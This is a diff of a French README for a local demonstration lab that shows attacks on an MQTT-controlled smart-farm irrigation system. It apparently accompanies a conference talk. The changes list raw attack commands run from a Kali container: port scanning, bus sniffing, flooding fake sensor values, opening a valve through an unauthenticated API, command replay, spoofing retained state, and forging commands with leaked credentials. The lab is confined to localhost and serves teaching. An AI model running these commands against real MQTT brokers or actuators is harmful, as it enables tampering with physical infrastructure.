@@ -10,7 +10,7 @@ aucune cible externe. Le lab reste sur `127.0.0.1` par défaut.
   (humidité, température,     ▲                │ POST /api/valve/{open,close}
    débit, vanne)              │                ▼
        ▲                      └──── commande MQTT (token ou HMAC) ────┘
-       └───────────────── attacker (profil « attack »)
+       └───────────────── attacker — Kali (profil « attack »)
 ```
 
 | Service | Rôle | Port hôte |
@@ -18,7 +18,7 @@ aucune cible externe. Le lab reste sur `127.0.0.1` par défaut.
 | `mosquitto` | Broker MQTT (config selon le mode) | `1883` (clair), `8883` (TLS) |
 | `simulator` | Capteurs + contrôleur de vanne | — |
 | `dashboard` | Tableau de bord, modèle de rendement, journal, impact | `8080` |
-| `attacker` | `attack.py`, `nmap`, `mosquitto_pub/sub` (`profiles: [attack]`) | — |
+| `attacker` | **Kali Linux** : `nmap`, `mosquitto_pub/sub`, `curl`, `python3` (`profiles: [attack]`) | — |
 
 Noms Docker : `<STACK_NAME>-<service>` (par défaut `gdg-farm-dev-dashboard`, etc.).
 
@@ -34,7 +34,7 @@ Noms Docker : `<STACK_NAME>-<service>` (par défaut `gdg-farm-dev-dashboard`, et
 
 ```bash
 cd gdg_lome/2026/demos
-docker pull eclipse-mosquitto:2 python:3.12-slim
+docker pull eclipse-mosquitto:2 kalilinux/kali-rolling
 bash scripts/setup.sh        # .env, secrets, CA + certificat, comptes MQTT, images
 bash scripts/mode.sh insecure
 ```
@@ -56,51 +56,48 @@ les services de la ferme (`mosquitto simulator dashboard` — ce qui vide aussi 
 n'est **pas** touché : son shell survit à la bascule de mode.
 Ne pas préfixer une seule commande (`FARM_MODE=secure docker compose ...`).
 
-## Déroulé scripté
+## L'attaquant Kali (lancé une fois)
+
+L'attaquant est un conteneur **Kali Linux persistant** : on le démarre **une fois** et on
+garde son shell ouvert tout le talk. `nmap`, `mosquitto_pub/sub`, `curl`, `python3` y sont
+déjà installés.
 
 ```bash
-bash scripts/demo.sh all          # ou acte1 | acte2 | acte3 | acte4
-NO_PAUSE=1 bash scripts/demo.sh all   # sans pause (répétition rapide, ~2 min)
+docker compose --profile attack up -d attacker    # démarre Kali (persistant)
+docker compose exec attacker bash                  # ouvre un shell dedans
+# raccourci équivalent :
+bash scripts/attack.sh
 ```
 
-Le script démarre l'attaquant une fois (`docker compose exec`) et réutilise ce même
-conteneur persistant pour toutes les étapes, au lieu d'en recréer un par commande.
+L'attaquant reste vivant quand on change de mode. Les identifiants « fuités » du mode
+hardened sont dans son environnement : `$LEAK_VIEWER_PASS`, `$LEAK_MAINTENANCE_PASS`,
+`$LEAK_SENSOR02_PASS`.
 
-## Commandes d'attaque
+## Commandes d'attaque (brutes, ligne par ligne)
 
-L'attaquant est un **conteneur persistant** : on le démarre **une fois**, puis on s'y
-connecte et on tape les commandes dedans, sans préfixe `docker` à chaque étape.
+La démo n'utilise **aucun script** : chaque attaque est une commande explicite, tapée dans
+le shell Kali. Le détail slide par slide est dans [`../docs/demo_commandes.md`](../docs/demo_commandes.md).
 
-```bash
-bash scripts/attack.sh            # démarre l'attaquant (si besoin) et ouvre un shell dedans
-# équivaut à :
-docker compose --profile attack up -d attacker
-docker compose exec attacker bash
-```
-
-Dans ce shell (outils déjà présents : `attack.py`, `nmap`, `mosquitto_pub`/`mosquitto_sub`),
-les commandes du tableau ci-dessous se tapent **nues** : `python attack.py <cmd>` pour les
-sous-commandes `attack.py`, et directement `nmap …` / `mosquitto_sub …` pour les autres.
-L'attaquant reste vivant quand on change de mode. Pour une commande unique sans ouvrir de
-shell : `bash scripts/attack.sh python attack.py state`.
-
-| Commande | Effet |
+| Attaque | Commande brute (depuis le shell attaquant) |
 |---|---|
-| `python attack.py recon` | ports 1883, 8883, 8080 |
-| `nmap -sV -p 1883,8883,8080 mosquitto dashboard` | versions des services |
-| `python attack.py anon` | tentatives anonymes en clair et en TLS |
-| `python attack.py sniff [--topic T] [--as U]` | écoute du bus |
-| `python attack.py flood --value V [--count N] [--as U]` | fausses mesures d'humidité |
-| `python attack.py drift [--as U]` | dérive lente sous le seuil du détecteur |
-| `python attack.py valve [--secure] [--close]` | API vanne, sans ou avec le token opérateur |
-| `python attack.py replay [--simulate-operator] [--close-first] [--as U]` | capture puis rejeu d'une commande |
-| `python attack.py forge [--as U]` | commande forgée sans clé HMAC |
-| `python attack.py spoof-state [--state CLOSED] [--as U]` | faux état de vanne retenu |
-| `python attack.py state` / `python attack.py score` | état, impact et journal / score du modèle |
-| `python attack.py reset` | remise à zéro (commande de lab, hors scénario) |
+| Recon ports/versions | `nmap -sT -sV -p 1883,8883,8080 mosquitto dashboard` |
+| Écoute du bus | `mosquitto_sub -h mosquitto -t '#' -v -W 6` |
+| Fausse humidité | `for i in $(seq 1 15); do mosquitto_pub -h mosquitto -t farm/sensor/humidity -m 0; done` |
+| Ouvrir la vanne (insecure) | `curl -i -X POST http://dashboard:8080/api/valve/open` |
+| État / impact | `curl -s http://dashboard:8080/api/state` |
+| Capturer une commande | `mosquitto_sub -h mosquitto -t farm/actuator/valve -C 1` |
+| Rejouer (secure) | `mosquitto_pub -h mosquitto -t farm/actuator/valve -m '{"command":"OPEN","token":"gdg-demo-token"}'` |
+| Faux état retenu | `mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED` |
+| Anonyme refusé (hardened) | `mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -t '#' -C 1` |
+| Sniff « viewer » (hardened) | `mosquitto_sub -h mosquitto -p 8883 --cafile /certs/ca.crt -u viewer -P "$LEAK_VIEWER_PASS" -t 'farm/#' -v -W 4` |
+| Forger sans HMAC (hardened) | `mosquitto_pub -h mosquitto -p 8883 --cafile /certs/ca.crt -u maintenance -P "$LEAK_MAINTENANCE_PASS" -t farm/actuator/valve -m '{"command":"OPEN"}'` |
 
-`--as viewer|maintenance|sensor-02` utilise des identifiants « fuités » à faibles droits
-(TLS 8883). `--tls` tente une connexion TLS anonyme.
+> En mode hardened, un `mosquitto_pub` refusé par l'ACL ou par la signature n'affiche pas
+> d'erreur côté client : le rejet se lit dans le **journal du dashboard** (`docker compose
+> logs -f simulator dashboard`) et sur l'état de la vanne (reste CLOSED).
+
+> Héritage : `attack.py` (wrapper Python) et `scripts/demo.sh` (déroulé automatique) restent
+> dans le dépôt pour référence, mais la démo officielle se fait en commandes brutes.
 
 ## Hypothèses d'impact
 
@@ -115,7 +112,7 @@ Serre de tomates de 500 m² (maraîchage péri-urbain), 4 000 kg par cycle à 50
 docker compose stop              # garde les conteneurs
 docker compose down              # supprime conteneurs et réseau (garde images + secrets)
 bash scripts/teardown.sh         # supprime TOUT : conteneurs, réseau, images, secrets locaux
-bash scripts/teardown.sh --purge # idem + images de base (mosquitto, python)
+bash scripts/teardown.sh --purge # idem + images de base (mosquitto, kali)
 ```
 
 `teardown.sh` efface par défaut la PKI, les mots de passe et le `.env` générés :
